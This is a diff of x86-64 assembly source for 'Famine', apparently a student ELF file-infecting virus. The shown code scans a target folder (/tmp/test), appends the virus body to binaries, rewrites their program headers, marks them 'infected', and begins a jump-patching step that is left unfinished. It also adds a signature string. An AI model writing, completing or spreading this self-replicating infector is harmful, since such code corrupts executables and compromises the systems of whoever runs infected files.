@@ -99,11 +99,6 @@ _folder_to_infect:
 	mov qword [r15 + 4], '/tes'
 	mov qword [r15 + 8], 't/'                ; assigning /tmp/test to the beginning of the r15 register
 
-	; mov rdi, r15                                 ; ?????????????
-	; mov [r15 + 16], rax
-	; test rax, rax
-	; js _end                                      ; if open fails, exit silently ??
-
 _folder_stat:
 	mov rdi, r15
 	lea rsi, [r15 + 32]
@@ -261,11 +256,11 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rdi, [r15 + 1420]
 			lea rsi, [rbp + _start]
 			mov rdx, _stop - _start
-			mov r10, rax                     ; end of target to start appending
+			mov r10, rax                           ; end of target to start appending
 			mov rax, SYS_PWRITE64
 			syscall
 
-		_rewrite_phdr:              ; writes new header modifications to the binary
+		_rewrite_phdr:                             ; writes new header modifications to the binary
 			mov rdi, [r15 + 1420]
 			lea rsi, [r15 + 1424]
 			mov rdx, PHDR_SIZE
@@ -277,7 +272,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov qword r9, [r15 + 1440]
 			mov qword [r15 + 1324], r9
 
-			mov byte [r15 + 1308], 'I'
+			mov byte [r15 + 1308], 'I'              ; sign as infected
 
 			mov rdi, [r15 + 1420]
 			lea rsi, [r15 + 1300]
@@ -285,6 +280,18 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov r10, 0
 			mov rax, SYS_PWRITE64
 			syscall
+
+		_patch_jmp:
+			mov rax, SYS_LSEEK
+			mov rdi, [r15 + 1420]
+			mov rsi, 0
+			mov rdx, SEEK_END
+			syscall
+
+			mov rdx, [r15 + 1440]
+			add rdx, 5 							   ; JMP + 0xNNNNNNNN (5 bytes)
+			
+			
 
 			jmp _close_bin
 
@@ -312,6 +319,12 @@ _end:
 	add rsp, FAMINE_STACK_SIZE
 	pop rsp
 	pop rdx
+
+	signature:
+		call famine
+			db "Famine version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night's Watch"
+	famine:
+		
 _stop:
 	mov rax, SYS_EXIT
 	xor rdi, rdi
